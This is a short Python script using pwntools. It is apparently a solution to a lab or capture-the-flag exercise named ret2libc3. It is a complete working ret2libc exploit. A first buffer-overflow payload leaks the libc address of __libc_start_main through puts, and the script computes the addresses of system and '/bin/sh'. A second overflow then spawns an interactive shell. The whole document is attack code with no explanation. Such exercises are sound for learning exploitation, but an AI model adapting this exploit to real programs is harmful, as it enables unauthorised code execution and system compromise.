from pwn import *

offset = 0x6c + 4

elf_ret2libc3 = ELF('../ex1/ret2libc3')
elf_libc = ELF('/lib/i386-linux-gnu/libc.so.6')
sh = process("../ex1/ret2libc3")

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_start = elf_ret2libc3.symbols['_start']

payload1 = flat([b'A'*offset, plt_puts, addr_start, got_libc_start_main])

sh.sendlineafter('Can you find it !?',payload1)

libc_start_main_addr = u32(sh.recv()[0:4])

print('%#x'%libc_start_main_addr)

libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']

system_addr = libc_base + elf_libc.symbols['system']

addr_bin_sh = libc_base + next(elf_libc.search(b'/bin/sh')) 

print('%#x'%next(elf_libc.search(b'/bin/sh')))

payload2 = flat([b'A'*offset, system_addr, 0xdeadbeef, addr_bin_sh])
sh.sendline(payload2)

sh.interactive()